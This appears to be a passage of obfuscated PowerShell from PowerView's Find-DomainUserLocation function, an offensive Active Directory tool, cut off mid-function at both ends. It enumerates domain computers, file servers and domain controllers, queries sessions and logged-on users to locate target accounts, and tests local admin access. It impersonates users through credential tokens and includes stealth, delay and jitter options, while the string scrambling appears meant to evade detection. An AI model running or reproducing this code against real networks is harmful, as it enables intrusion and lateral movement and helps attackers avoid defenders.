        ${Re`s`U`LT`paGeSIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERvE`RT`Im`elimIT},

        [Switch]
        ${t`O`mBStONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Red`ENtiaL} =  ( CHiLditEm  ("VARi"+"ABlE:7tq"+"02"))."vA`LuE"::"e`MPty",

        [Switch]
        ${s`TopONs`U`cceSS},

        [ValidateRange(1, 10000)]
        [Int]
        ${Del`Ay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${Jit`Ter} = .3,

        [Parameter(paramEtERSeTNaME = "sH`Owa`lL")]
        [Switch]
        ${S`hO`WaLl},

        [Switch]
        ${Ste`AL`Th},

        [String]
        [ValidateSet('DFS', 'DC', {"{0}{1}"-f'F','ile'}, 'All')]
        ${ST`e`Althso`UrcE} = 'All',

        [Int]
        [ValidateRange(1, 100)]
        ${tHR`E`ADS} = 20
    )

    BEGIN {

        ${CoMPute`RS`e`A`RChErARg`Um`enTs} = @{
            ("{0}{2}{1}{3}" -f 'Pro','er','p','ties') = ("{0}{2}{1}" -f 'dnshos','name','t')
        }
        if (${p`SBo`UnDPARAME`T`Ers}[("{0}{1}"-f'Dom','ain')]) { ${coMPut`eR`sE`ArcHERaR`G`UmenTS}[("{1}{0}" -f 'ain','Dom')] = ${dom`A`in} }
        if (${p`s`BOund`parAm`eteRs}[("{0}{2}{3}{1}" -f'Compu','in','terDom','a')]) { ${cOmpuTe`R`SeARCh`EraRgUmE`NTs}[("{0}{1}"-f 'Do','main')] = ${coMPuteR`d`oM`AiN} }
        if (${pSBOundPAR`A`mE`T`e`RS}[("{1}{0}{4}{3}{5}{2}" -f 'put','Com','r','DAPFi','erL','lte')]) { ${C`oMp`UtERseaRChERARG`U`MENts}[("{2}{0}{1}" -f'PFi','lter','LDA')] = ${c`OMPu`TERL`daPf`ilTeR} }
        if (${P`sB`oundpa`RAMe`TerS}[("{3}{5}{0}{2}{4}{1}"-f 'ar','se','chB','Co','a','mputerSe')]) { ${COMpUTERseA`RcH`ErA`R`guM`enTS}[("{0}{1}{2}" -f 'Sear','chBas','e')] = ${CO`mPutERs`eA`RC`HbA`se} }
        if (${PSBoUNd`pA`R`A`mEters}[("{2}{3}{0}{1}{4}"-f'n','straine','Unc','o','d')]) { ${CoM`pUT`e`RseArC`HeRAR`gUM`e`NtS}[("{2}{0}{1}"-f'c','onstrained','Un')] = ${uncon`STRain`ed} }
        if (${PSBO`UN`Dp`A`RAmeters}[("{2}{1}{4}{0}{3}"-f 'ratingSyst','uterOp','Comp','em','e')]) { ${c`oMPuteRS`eArcH`eraRgUMen`TS}[("{3}{4}{2}{1}{0}"-f'tem','ngSys','i','Opera','t')] = ${oPER`AT`INgS`yST`eM} }
        if (${P`S`BounDPaR`AME`T`ers}[("{2}{3}{1}{0}" -f 'k','ac','Comput','erServiceP')]) { ${cOmp`UT`ErsEarchEr`ARGUm`e`NtS}[("{1}{0}{2}" -f'cePac','Servi','k')] = ${s`ERVicepA`cK} }
        if (${pSbo`UnDPARa`mE`Te`RS}[("{0}{2}{1}{3}" -f'Comp','Si','uter','teName')]) { ${CoMputEr`seaRCheRaR`g`UmEN`Ts}[("{1}{0}" -f'me','SiteNa')] = ${SIT`enaME} }
        if (${psB`OuNdPArAme`T`ers}[("{1}{0}" -f'er','Serv')]) { ${C`o`M`p`UtErSEa`RcherAr`Gu`MEnTS}[("{1}{0}"-f 'r','Serve')] = ${Ser`V`er} }
        if (${ps`B`oUN`d`PaRAMETE`RS}[("{3}{2}{1}{0}" -f'Scope','h','c','Sear')]) { ${COMpU`TEr`sEarc`HEr`ARgUM`enTS}[("{3}{2}{1}{0}"-f'cope','S','h','Searc')] = ${s`eaRcH`scOpE} }
        if (${p`sBOuND`PAra`MEtE`RS}[("{2}{3}{0}{1}" -f 'ge','Size','Resu','ltPa')]) { ${cOMp`UtErSeA`R`C`HeRArgUm`ENTS}[("{2}{0}{3}{1}" -f 'esu','ze','R','ltPageSi')] = ${RESU`LTpAGe`s`Ize} }
        if (${PSBou`ND`p`ARamEterS}[("{0}{1}{2}{3}"-f 'S','erverT','i','meLimit')]) { ${co`mpute`Rs`EaR`Ch`erarG`UMENtS}[("{2}{0}{4}{1}{3}" -f 'erT','i','Serv','t','imeLim')] = ${SE`RV`erT`Ime`limit} }
        if (${p`SboundPa`RAM`EteRs}[("{1}{2}{0}" -f 'e','T','ombston')]) { ${c`O`mpu`TE`RsEaR`ch`eRarGU`M`EntS}[("{2}{1}{0}" -f'e','n','Tombsto')] = ${to`M`BsTONE} }
        if (${psBo`UNdpAR`AM`e`Te`RS}[("{2}{0}{1}"-f 'tia','l','Creden')]) { ${CO`M`PU`TeRSea`RCHeR`ArGUMeNts}[("{2}{0}{1}"-f 'dentia','l','Cre')] = ${CR`eDeNti`AL} }

        ${use`RSEarCh`eR`A`Rgu`meNts} = @{
            ("{3}{0}{1}{2}"-f't','i','es','Proper') = ("{1}{0}{2}"-f'ntnam','samaccou','e')
        }
        if (${PS`B`ouNdpARaMeT`eRS}[("{3}{2}{1}{0}"-f'ntity','e','erId','Us')]) { ${U`sersEA`RCh`erA`RG`UM`ENtS}[("{1}{2}{0}" -f'y','Iden','tit')] = ${uSE`R`i`deNtitY} }
        if (${PsBo`U`NDp`A`RaMet`ERs}[("{1}{0}" -f'ain','Dom')]) { ${USErsEa`R`cH`eR`ARgUMEntS}[("{0}{1}"-f 'D','omain')] = ${dO`Main} }
        if (${psB`ound`PARaMe`Te`Rs}[("{0}{2}{1}"-f 'UserDo','ain','m')]) { ${UsER`SE`ArCHE`Ra`RGUmeNTs}[("{0}{1}"-f 'Domai','n')] = ${Us`Erd`oMAiN} }
        if (${pSbo`UN`dp`ARaM`e`TeRS}[("{0}{2}{3}{1}"-f'UserLDA','ter','PFi','l')]) { ${usErs`EaRCHe`RAr`gUmen`TS}[("{3}{0}{1}{2}" -f'D','APF','ilter','L')] = ${USErldaPFi`l`T`eR} }
        if (${PsBOu`NDpArAM`Et`E`Rs}[("{1}{2}{0}{3}"-f'ear','U','serS','chBase')]) { ${use`RSearch`er`ArguM`eNts}[("{0}{1}{2}" -f 'Searc','hBas','e')] = ${U`SeRSEaR`cHBA`se} }
        if (${pS`BOu`ND`pa`RAMeteRs}[("{1}{3}{0}{2}" -f 'ou','UserAdmi','nt','nC')]) { ${Us`E`R`SEARcH`e`R`ARGUmenTS}[("{1}{0}{2}"-f'Co','Admin','unt')] = ${us`E`RaDMinco`UNt} }
        if (${psBo`UNDPar`A`M`ETeRs}[("{2}{1}{3}{0}" -f'ation','AllowDe','User','leg')]) { ${us`ERse`A`RC`hE`RArgUMEnTS}[("{1}{0}{2}{3}"-f'g','AllowDele','a','tion')] = ${us`e`R`A`llowdElEgaTI`On} }
        if (${ps`B`OUN`DPA`RAM`EteRs}[("{0}{1}{2}" -f'S','erv','er')]) { ${UsERSe`ARchera`RG`UMe`N`Ts}[("{2}{0}{1}"-f'erv','er','S')] = ${SErV`Er} }
        if (${pSbouN`dP`Aram`eTeRs}[("{2}{0}{1}" -f 'arc','hScope','Se')]) { ${US`eRSeA`Rc`HeR`Ar`gUme`NTS}[("{2}{1}{0}" -f 'ope','earchSc','S')] = ${seA`RC`hsC`oPE} }
        if (${psBouN`dParAm`eT`ERs}[("{1}{4}{3}{0}{2}"-f'iz','ResultPag','e','S','e')]) { ${Us`erse`A`RChe`Rar`gU`mENTS}[("{1}{0}{2}"-f 'ltPageS','Resu','ize')] = ${rEsU`Lt`pAgeS`IZE} }
        if (${pSBOUN`Dp`A`R`A`MeTerS}[("{2}{1}{4}{3}{0}"-f 'it','erv','S','imeLim','erT')]) { ${us`eR`SEARchERArgu`Me`NTS}[("{0}{2}{1}"-f 'Ser','imeLimit','verT')] = ${SerVe`R`Time`lIMit} }
        if (${P`sbo`UND`PaRAmeTe`Rs}[("{0}{1}{2}" -f'T','ombst','one')]) { ${uSe`R`sEARcH`e`R`ARGuMentS}[("{2}{1}{0}" -f'one','st','Tomb')] = ${tombS`T`oNE} }
        if (${pS`BoundP`ArAMeTe`RS}[("{0}{1}{2}" -f 'C','red','ential')]) { ${uSErSe`Ar`C`heRAr`GUMeNTS}[("{1}{2}{0}"-f'tial','Cr','eden')] = ${cReD`EN`T`IAl} }

        ${tar`Get`cOM`PuT`ers} = @()

        
        if (${pSbOUnD`PAr`AM`eters}[("{0}{1}{2}{3}"-f'Com','puterN','am','e')]) {
            ${ta`RGEtC`oMP`Ute`RS} = @(${CoMpu`TEr`N`AMe})
        }
        else {
            if (${p`SBOUndpA`R`AMEte`Rs}[("{1}{0}"-f'ealth','St')]) {
                &("{4}{1}{0}{2}{3}"-f'V','-','erbo','se','Write') ('[Find-'+'D'+'omainUserLo'+'ca'+'tion'+'] '+'St'+'e'+'alth '+'e'+'n'+'umeration'+' '+'usin'+'g '+'s'+'ource:'+' '+"$StealthSource")
                ${T`A`RGET`c`OmPutE`RarraYliSt} = &("{2}{1}{0}"-f 'ct','ew-Obje','N') ("{1}{6}{7}{4}{3}{2}{5}{0}"-f'yList','Sy','ns','o','ti','.Arra','stem.C','ollec')

                if (${st`EAlT`H`SOuRCe} -match ((("{0}{2}{1}" -f'Fi','ll','leNdkA'))."rEpla`Ce"(([CHAr]78+[CHAr]100+[CHAr]107),[sTRiNg][CHAr]124))) {
                    &("{0}{1}{2}"-f 'W','rite-Verbo','se') ("{7}{4}{5}{1}{8}{0}{9}{10}{2}{3}{6}"-f'n','UserLocat','ng fo','r file server','d-D','omain','s','[Fin','io','] Que','ryi')
                    ${fILesE`RV`ErSEa`Rc`hEraRGum`E`NTs} = @{}
                    if (${pSboU`ND`paRAM`EtERs}[("{1}{0}" -f'ain','Dom')]) { ${FIle`S`ER`VEr`se`ARcHeR`Ar`GUME`NTS}[("{1}{0}"-f'omain','D')] = ${d`O`MaiN} }
                    if (${pS`BoUNd`p`A`RAm`EtErS}[("{0}{2}{1}{3}"-f 'C','er','omput','Domain')]) { ${fI`LesERve`RSearch`eRArGUme`Nts}[("{0}{1}"-f 'Domai','n')] = ${CoM`pu`TEr`d`oMaiN} }
                    if (${ps`Bou`NDpAr`A`METErs}[("{1}{3}{2}{0}" -f 'chBase','Computer','ar','Se')]) { ${fiLESERV`e`Rs`EARcH`erARgUMEnts}[("{2}{1}{0}"-f'e','archBas','Se')] = ${COmpUTeR`SEA`RCHb`Ase} }
                    if (${PSBOU`NdPA`Ra`METERs}[("{0}{1}{2}" -f 'Serv','e','r')]) { ${fi`lEseRvErseaRCHeraRGum`e`N`TS}[("{1}{0}"-f'er','Serv')] = ${seR`V`Er} }
                    if (${P`SBoUnD`p`ArAmET`e`RS}[("{1}{2}{0}" -f'e','SearchSco','p')]) { ${FiLeServEr`sEaR`c`hE`RA`Rgum`ENts}[("{0}{1}{3}{2}"-f'Se','arc','pe','hSco')] = ${S`E`Ar`ChscopE} }
                    if (${pSboUndPA`Ra`M`eT`E`Rs}[("{3}{4}{0}{1}{2}" -f'Pag','eS','ize','Res','ult')]) { ${F`ilESERVE`RSEaRChErar`G`U`m`eNts}[("{1}{3}{2}{0}" -f'e','ResultP','z','ageSi')] = ${ResU`ltpAgesi`Ze} }
                    if (${psb`o`UnDPa`RAMe`Te`Rs}[("{3}{0}{1}{2}" -f'erTi','meLi','mit','Serv')]) { ${fiL`eSEr`V`ErSeA`R`CheRa`RGUmenTS}[("{0}{2}{1}"-f'ServerTime','it','Lim')] = ${seR`VE`RtIme`lImit} }
                    if (${pSbOunD`Par`A`m`eT`Ers}[("{1}{0}"-f 'one','Tombst')]) { ${fILE`S`e`RVE`Rsea`Rch`erAr`GUME`NtS}[("{0}{1}{2}{3}"-f 'T','o','mbston','e')] = ${Tom`Bs`TOne} }
                    if (${PS`B`OuNDPARA`m`EtERs}[("{2}{0}{1}" -f 'denti','al','Cre')]) { ${FIleSerVER`SE`A`Rche`RA`RG`U`MENTs}[("{1}{2}{0}{3}"-f'dentia','Cr','e','l')] = ${cReD`en`TIAl} }
                    ${fIlEs`ER`Vers} = &("{1}{0}{2}{4}{3}" -f't-','Ge','Doma','er','inFileServ') @FileServerSearcherArguments
                    if (${FiLe`SerV`Ers} -isnot [System.Array]) { ${fIl`e`serVeRS} = @(${F`Il`eS`eRvers}) }
                    ${taR`GetCoMputE`RA`RRA`YliSt}.("{1}{0}{2}" -f'R','Add','ange').Invoke( ${FiL`EsERv`ErS} )
                }
                if (${STe`AL`Ths`ouRCe} -match ((("{1}{0}" -f '}All','DFS{0'))-F[CHAr]124)) {
                    &("{0}{1}{2}{3}"-f'Write-','V','e','rbose') ("{3}{6}{8}{4}{0}{1}{2}{7}{5}" -f' Quer','ying for DFS s','erv','[Fi','inUserLocation]','rs','n','e','d-Doma')
                    
                    
                }
                if (${s`TeaLTHSOUR`ce} -match ((("{1}{2}{0}" -f 'll','DC{','0}A'))  -f[cHAR]124)) {
                    &("{3}{1}{0}{2}"-f'ite-','r','Verbose','W') ("{7}{9}{8}{5}{10}{13}{2}{4}{12}{0}{11}{3}{1}{6}"-f'r','g for domain','ti','in','on','ai',' controllers','[','m','Find-Do','nUserLo','y','] Que','ca')
                    ${D`cS`EarChe`RA`R`gUmENTS} = @{
                        ("{0}{1}"-f'L','DAP') = ${TR`Ue}
                    }
                    if (${PSb`O`UNd`parAMeT`ers}[("{0}{1}"-f 'D','omain')]) { ${Dc`seA`RcHERArg`U`ments}[("{2}{0}{1}" -f 'ai','n','Dom')] = ${Do`MaIn} }
                    if (${psbO`UndPAr`A`Me`TERS}[("{3}{2}{1}{0}"-f 'rDomain','ute','omp','C')]) { ${dC`SeaRcheRA`Rg`UMeNTs}[("{1}{0}"-f'main','Do')] = ${cO`MpuTErDoM`Ain} }
                    if (${PS`B`ouND`paramETerS}[("{0}{1}" -f 'Serve','r')]) { ${dC`se`ARcheRar`guMentS}[("{1}{0}" -f'erver','S')] = ${sEr`VEr} }
                    if (${PSB`oUN`DP`Ar`AmETe`RS}[("{2}{1}{0}"-f 'l','edentia','Cr')]) { ${DcsEarche`Rar`Gum`EntS}[("{0}{3}{2}{1}" -f 'C','al','i','redent')] = ${CrE`DenTi`AL} }
                    ${domAi`NcoN`Tr`Ol`Le`RS} = &("{3}{4}{1}{5}{2}{0}" -f'er','Domai','troll','Get','-','nCon') @DCSearcherArguments | &("{1}{0}{2}" -f'b','Select-O','ject') -ExpandProperty ("{0}{2}{1}"-f 'd','e','nshostnam')
                    if (${DoMaI`NcoNTR`O`l`LErS} -isnot [System.Array]) { ${D`oMaInc`ONTrOll`Ers} = @(${dOmaI`Nc`OnT`Ro`l`leRS}) }
                    ${tArGETcO`mP`UTe`RArRaY`Li`ST}.("{1}{0}{2}" -f'ng','AddRa','e').Invoke( ${doMain`COntRO`l`l`eRS} )
                }
                ${T`A`RGeTCo`MpUTE`Rs} = ${tAr`gEtCOm`puTE`R`ArRaYlIsT}.("{2}{0}{1}" -f'Ar','ray','To').Invoke()
            }
            else {
                &("{2}{4}{1}{3}{0}" -f 'bose','-V','Wr','er','ite') ("{0}{9}{3}{14}{17}{2}{10}{7}{5}{11}{1}{15}{4}{18}{16}{6}{13}{12}{8}" -f'[','g for ','inUserLoc','D','l c','uer',' in ','] Q','in','Find-','ation','yin','oma','the d','om','al','ers','a','omput')
                ${Tar`Get`Compu`TeRS} = &("{0}{2}{3}{1}"-f 'Get','mputer','-Doma','inCo') @ComputerSearcherArguments | &("{2}{1}{3}{0}"-f't','t-','Selec','Objec') -ExpandProperty ("{2}{1}{0}" -f'tname','nshos','d')
            }
        }
        &("{3}{0}{1}{2}"-f'V','e','rbose','Write-') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "
        if (${T`Arg`ET`CompU`TerS}."L`ENgtH" -eq 0) {
            throw ("{6}{3}{8}{2}{0}{5}{1}{7}{9}{10}{11}{4}" -f 'UserL','] No','n','nd-D',' enumerate','ocation','[Fi',' hos','omai','ts ','found',' to')
        }

        
        if (${pSbOuNd`P`ARAM`eteRs}[("{2}{1}{3}{0}" -f'tial','d','Cre','en')]) {
            ${cUrr`eNT`UsER} = ${CrEd`enti`AL}.("{5}{4}{1}{2}{3}{0}" -f'al','tworkC','redent','i','tNe','Ge').Invoke()."uS`ERname"
        }
        else {
            ${cu`RRE`NtUs`ER} = ( (GeT-ITEM  ("v"+"ArIABle:"+"Rqf0"+"6")  )."V`ALuE"::"uSERNA`mE").("{2}{1}{0}"-f'er','Low','To').Invoke()
        }

        
        if (${PsBOuN`Dp`Ar`AMetErs}[("{0}{1}"-f'Sh','owAll')]) {
            ${taRGeTus`e`Rs} = @()
        }
        elseif (${psBoU`Nd`P`ArAm`ET`ers}[("{0}{1}{2}" -f'U','serId','entity')] -or ${ps`B`OUndP`ArAmeTErS}[("{3}{1}{2}{4}{0}" -f 'er','er','LDAPFil','Us','t')] -or ${PS`BouN`DpaRA`meterS}[("{2}{0}{1}{4}{3}" -f'se','rSea','U','hBase','rc')] -or ${PS`Bo`UNd`PaRamETE`Rs}[("{1}{0}{2}" -f'erA','Us','dminCount')] -or ${PS`BoUN`dPARAM`ETE`RS}[("{2}{1}{0}{3}" -f'AllowDelegati','ser','U','on')]) {
            ${TaRGE`Tus`ERS} = &("{0}{4}{3}{2}{1}"-f'Get','ainUser','m','Do','-') @UserSearcherArguments | &("{1}{3}{2}{0}"-f't','Sele','c','ct-Obje') -ExpandProperty ("{2}{1}{0}" -f 'tname','oun','samacc')
        }
        else {
            ${g`R`ou`PSeaRch`ER`AR`gUMen`TS} = @{
                ("{2}{0}{1}"-f 'en','tity','Id') = ${UseRgr`O`UpideNTI`Ty}
                ("{0}{1}"-f 'Recurs','e') = ${T`Rue}
            }
            if (${PsbOUNDp`A`Ra`mE`Te`RS}[("{0}{2}{1}"-f'User','main','Do')]) { ${gR`oUP`Sea`RCH`ER`ARG`UMenTs}[("{0}{1}"-f 'D','omain')] = ${UsErDO`m`AiN} }
            if (${PsB`oUNdPAr`Ame`TERs}[("{0}{2}{3}{1}" -f'Use','se','rSea','rchBa')]) { ${Gr`ou`psEar`c`HeR`ARG`U`mENtS}[("{1}{3}{0}{2}"-f'hBa','S','se','earc')] = ${us`eRS`eaRChb`ASe} }
            if (${PsB`oU`NdPAraM`ete`RS}[("{1}{0}"-f'ver','Ser')]) { ${GroupS`EarcheR`ARguM`en`Ts}[("{2}{1}{0}" -f'ver','r','Se')] = ${SEr`Ver} }
            if (${PSBOu`Ndpa`RA`Mete`Rs}[("{2}{1}{3}{0}" -f 'pe','earc','S','hSco')]) { ${Gro`U`PsEarc`HeRA`R`guMen`TS}[("{1}{0}{2}"-f 'earch','S','Scope')] = ${Se`Archs`C`OpE} }
            if (${psBOUn`DpaR`AmE`TE`RS}[("{2}{1}{0}{3}" -f 'su','e','R','ltPageSize')]) { ${groupS`E`ARc`herA`Rgum`e`NtS}[("{0}{3}{2}{1}{4}"-f'Result','i','ageS','P','ze')] = ${resU`L`TpAGE`sIZe} }
            if (${PS`BO`UNDP`ArAME`Ters}[("{3}{4}{1}{0}{2}"-f 'meL','verTi','imit','Se','r')]) { ${GRo`UpSEaR`C`HERAR`G`Um`eNTS}[("{2}{0}{1}{4}{3}"-f 'r','T','Serve','t','imeLimi')] = ${s`e`RVERTIMELI`MIt} }
            if (${p`sbOuNDp`A`RAMetErS}[("{1}{0}{2}"-f'on','Tombst','e')]) { ${g`ROUpS`eArCHEr`A`Rgum`e`NTS}[("{2}{0}{1}"-f'om','bstone','T')] = ${tom`BsTo`NE} }
            if (${psboUndpaRA`m`ET`Ers}[("{2}{1}{0}" -f 'ial','t','Creden')]) { ${Gr`Ou`PS`eA`RcHEraRgum`ENtS}[("{0}{1}{2}"-f 'Cr','ed','ential')] = ${CRe`dE`N`TiaL} }
            ${Ta`R`getUsERS} = &("{3}{0}{2}{4}{1}{5}"-f't-Domain','b','GroupM','Ge','em','er') @GroupSearcherArguments | &("{3}{4}{0}{1}{2}"-f 'b','jec','t','Select-','O') -ExpandProperty ("{2}{0}{1}"-f 'erNa','me','Memb')
        }

        &("{0}{2}{1}"-f 'Write','ose','-Verb') "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length) "
        if ((-not ${SHo`wA`lL}) -and (${tAR`gE`T`UsErs}."lE`Ngth" -eq 0)) {
            throw ("{0}{5}{11}{12}{9}{1}{13}{7}{6}{3}{10}{8}{2}{4}" -f '[','ser','o','No u','und to target','Fi',' ','cation]','rs f','ainU','se','nd','-Dom','Lo')
        }

        
        ${H`OSteN`Um`BLOCk} = {
            Param(${c`OmPuTe`RNA`Me}, ${targ`e`T`USErs}, ${cuRReNt`Us`eR}, ${StEal`TH}, ${to`Ke`NHanD`LE})

            if (${T`OKen`HANd`LE}) {
                
                ${n`ULl} = &("{4}{3}{1}{2}{0}"-f 'rsonation','oke-Use','rImpe','nv','I') -TokenHandle ${Tok`eN`ha`NdLe} -Quiet
            }

            ForEach (${TAR`gEtC`OmP`UTer} in ${CompUtEr`N`AMe}) {
                ${UP} = &("{2}{1}{3}{0}{4}"-f'ecti','n','Test-Co','n','on') -Count 1 -Quiet -ComputerName ${TARget`c`oMP`Ut`Er}
                if (${u`p}) {
                    ${se`s`SionS} = &("{3}{1}{0}{2}" -f 'e','etS','ssion','Get-N') -ComputerName ${tAr`ge`T`COmpUtEr}
                    ForEach (${Se`SS`ion} in ${S`esSi`Ons}) {
                        ${U`SE`R`NAMe} = ${seSSI`oN}."us`ERN`AME"
                        ${cn`A`me} = ${SeS`SI`on}."c`NamE"

                        if (${cNa`Me} -and ${Cn`Ame}.("{0}{1}{2}" -f'St','a','rtsWith').Invoke('\\')) {
                            ${c`Na`me} = ${c`N`Ame}.("{2}{0}{1}" -f 'a','rt','TrimSt').Invoke('\')
                        }

                        
                        if ((${USER`NaMe}) -and (${Us`ErN`AMe}.("{0}{1}" -f 'Tri','m').Invoke() -ne '') -and (${u`SE`RName} -notmatch ${curR`e`NtUS`Er}) -and (${UsE`R`NAmE} -notmatch '\$$')) {

                            if ( (-not ${t`Arg`eT`USErS}) -or (${TaRgET`U`seRS} -contains ${us`erName})) {
                                ${U`S`ErlOCA`TIOn} = &("{2}{1}{0}"-f't','jec','New-Ob') ("{1}{2}{0}"-f 'ject','PSO','b')
                                ${User`lo`C`AtIon} | &("{1}{0}{2}"-f'dd-Membe','A','r') ("{0}{1}{2}" -f 'N','otep','roperty') ("{2}{1}{0}"-f'ain','om','UserD') ${n`UlL}
                                ${USerLO`CAT`ioN} | &("{0}{3}{2}{1}" -f 'Add-','r','mbe','Me') ("{1}{2}{0}{3}"-f'pe','Note','pro','rty') ("{1}{0}"-f 'serName','U') ${U`SeRNa`mE}
                                ${Us`eR`lo`c`ATiON} | &("{0}{1}{2}" -f 'A','dd-M','ember') ("{1}{0}{2}" -f'pro','Note','perty') ("{2}{3}{0}{1}" -f 'puterNam','e','Co','m') ${ta`RG`etCoMpU`TER}
                                ${uSE`RL`o`ca`TIon} | &("{2}{0}{1}" -f 'd-Memb','er','Ad') ("{3}{2}{1}{0}" -f 'erty','op','otepr','N') ("{0}{1}{2}"-f 'Ses','s','ionFrom') ${cN`AME}

                                
                                try {
                                    ${c`NaM`E`DnSNA`ME} =   ${6l`U5G4}::("{0}{1}{2}"-f'Get','HostEntr','y').Invoke(${Cn`AMe}) | &("{3}{4}{0}{2}{1}" -f'O','ct','bje','Select','-') -ExpandProperty ("{0}{2}{1}" -f'Hos','me','tNa')
                                    ${USe`RLoC`ATiON} | &("{1}{2}{3}{0}" -f'r','Add','-Memb','e') ("{3}{0}{2}{1}" -f'P','ty','roper','Note') ("{2}{1}{3}{0}" -f 'e','romNa','SessionF','m') ${CnamE`DNs`NaME}
                                }
                                catch {
                                    ${UserLO`CaT`IoN} | &("{2}{0}{1}"-f'embe','r','Add-M') ("{2}{0}{3}{1}"-f 'P','perty','Note','ro') ("{4}{1}{2}{0}{3}"-f'om','ssi','onFr','Name','Se') ${nu`Ll}
                                }

                                
                                if (${C`HE`ckaC`cEss}) {
                                    ${adM`IN} = (&("{1}{3}{0}{2}"-f'inA','T','ccess','est-Adm') -ComputerName ${cN`AmE})."is`A`dMIn"
                                    ${useRlOc`A`T`ion} | &("{0}{2}{1}"-f 'Add-','ber','Mem') ("{2}{0}{1}"-f'oteprop','erty','N') ("{2}{1}{0}" -f'min','d','LocalA') ${ad`MIN}."is`ADm`IN"
                                }
                                else {
                                    ${USerLoc`Ati`oN} | &("{1}{2}{0}" -f'r','Add-Memb','e') ("{1}{3}{2}{0}" -f 'ty','N','oper','otepr') ("{2}{0}{1}"-f'Ad','min','Local') ${nU`lL}
                                }
                                ${us`erl`OcaT`i`On}."ps`Obje`CT"."tyP`eNA`meS".("{1}{0}{2}"-f 'ns','I','ert').Invoke(0, ("{0}{1}{2}{4}{3}"-f'PowerV','iew.Us','erLo','ion','cat'))
                                ${Us`Erl`oCatIon}
                            }
                        }
                    }
                    if (-not ${steA`l`Th}) {
                        
                        ${l`og`gE`DOn} = &("{3}{4}{2}{1}{0}" -f 'on','ed','tLogg','Get-N','e') -ComputerName ${ta`Rget`Co`Mpu`TER}
                        ForEach (${us`Er} in ${log`ge`DoN}) {
                            ${use`R`Na`mE} = ${uS`er}."UsE`RN`AMe"
                            ${uSe`RDOMA`IN} = ${U`SeR}."L`og`oNdO`Main"

                            
                            if ((${u`sERnA`mE}) -and (${U`Se`RNA`Me}.("{1}{0}" -f'm','tri').Invoke() -ne '')) {
                                if ( (-not ${T`A`RgetUSeRs}) -or (${TaRge`Tu`SeRs} -contains ${uS`Ern`AMe}) -and (${uS`E`RNAME} -notmatch '\$$')) {
                                    ${IpAD`d`ReSs} = @(&("{0}{3}{1}{2}" -f'Resolve','Add','ress','-IP') -ComputerName ${Ta`Rge`T`COmpUT`er})[0]."Ip`A`DDrEsS"
                                    ${use`RlOcati`oN} = &("{2}{1}{0}"-f'ct','w-Obje','Ne') ("{0}{1}{2}"-f'P','SObj','ect')
                                    ${USE`R`lOca`TION} | &("{1}{0}{2}" -f 'd-Memb','Ad','er') ("{1}{0}{2}" -f'pro','Note','perty') ("{1}{2}{0}"-f'Domain','Us','er') ${Use`RDO`ma`In}
                                    ${u`seRl`OCatI`oN} | &("{1}{0}{2}"-f 'd-Me','Ad','mber') ("{1}{0}{2}"-f'ote','N','property') ("{1}{0}"-f 'ame','UserN') ${U`se`Rn`AmE}
                                    ${use`RL`OCA`Tion} | &("{2}{0}{1}"-f'-Memb','er','Add') ("{1}{2}{0}" -f'erty','Not','eprop') ("{2}{1}{0}"-f'Name','mputer','Co') ${T`ARg`et`CoMPuter}
                                    ${U`Se`RLOC`AtIOn} | &("{2}{1}{0}" -f'ember','dd-M','A') ("{0}{1}{2}" -f'Notep','ro','perty') ("{1}{0}{2}" -f 'es','IPAddr','s') ${IPa`DDR`E`Ss}
                                    ${USe`RLOCA`T`iON} | &("{2}{1}{0}" -f'r','-Membe','Add') ("{2}{1}{0}{3}" -f 'ropert','tep','No','y') ("{3}{1}{2}{0}"-f 'From','io','n','Sess') ${n`ULL}
                                    ${uSERLOCa`Ti`On} | &("{2}{0}{1}"-f 'be','r','Add-Mem') ("{1}{3}{2}{0}"-f 'erty','Notepr','p','o') ("{2}{0}{1}"-f 'am','e','SessionFromN') ${n`ULL}

                                    
                                    if (${chECkA`Cc`eSS}) {
                                        ${a`d`min} = &("{1}{3}{0}{4}{2}"-f'A','Test-Admi','ss','n','cce') -ComputerName ${tA`RgEtCOM`P`UTeR}
                                        ${u`sErLoC`A`T`ION} | &("{1}{0}{2}{3}" -f 'd','Ad','-Me','mber') ("{2}{1}{3}{0}"-f'perty','ep','Not','ro') ("{1}{2}{0}" -f'in','Loc','alAdm') ${adM`in}."isad`MiN"
                                    }
                                    else {
                                        ${uSerl`O`cATIOn} | &("{2}{1}{0}" -f'er','d-Memb','Ad') ("{2}{3}{0}{1}"-f'ropert','y','N','otep') ("{2}{1}{0}{3}"-f'i','alAdm','Loc','n') ${n`ULL}
                                    }
                                    ${u`SeRloc`ATIOn}."p`sOBJ`ECt"."Ty`P`en`AmES".("{1}{0}"-f 'nsert','I').Invoke(0, ("{1}{2}{0}{3}{4}" -f 's','PowerVie','w.U','e','rLocation'))
                                    ${usEr`locA`TiOn}
                                }
                            }
                        }
                    }
                }
            }

            if (${TOKe`NhaN`Dle}) {
                &("{1}{3}{0}{2}{4}" -f 'e-Rev','I','ertToSe','nvok','lf')
            }
        }

        ${lOG`ont`O`KEn} = ${NU`Ll}
        if (${pS`BouN`dpArAMe`TErS}[("{0}{1}{2}"-f 'Cred','enti','al')]) {
            if (${pSBOund`P`Aram`etERs}[("{0}{1}"-f 'D','elay')] -or ${PS`Bo`UN`dPaRAMe`TeRS}[("{1}{0}{2}" -f 'cce','StopOnSu','ss')]) {
                ${L`og`onT`okEn} = &("{1}{2}{5}{7}{6}{4}{3}{0}"-f'ation','I','nvoke-','son','er','U','mp','serI') -Credential ${c`REd`ENTIAl}
            }
            else {
                ${LOg`Onto`k`En} = &("{6}{0}{2}{7}{5}{3}{1}{4}" -f 'vo','ati','k','son','on','serImper','In','e-U') -Credential ${c`R`ED`eNTiAl} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${PS`BOUNdpArAM`E`T`eRS}[("{0}{1}"-f'D','elay')] -or ${PSb`oUnDPAR`Ame`Ters}[("{0}{1}{2}"-f'Sto','pO','nSuccess')]) {

            &("{3}{1}{0}{2}" -f 'V','ite-','erbose','Wr') "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count) "
